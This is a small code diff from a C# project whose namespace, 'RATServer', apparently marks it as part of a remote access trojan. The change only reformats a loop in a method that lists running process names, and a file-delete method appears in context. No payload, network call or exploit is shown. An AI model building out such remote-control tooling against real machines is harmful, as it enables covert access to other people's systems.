@@ -27,8 +27,7 @@ namespace RATServer
         public static string Processes()
         {
             string x = "";
-            foreach (Process p in Process.GetProcesses())
-                x += p.ProcessName + Environment.NewLine;
+            foreach (Process p in Process.GetProcesses()) x += p.ProcessName + Environment.NewLine;
             return x;
         }
         public static string Delete(string Path)
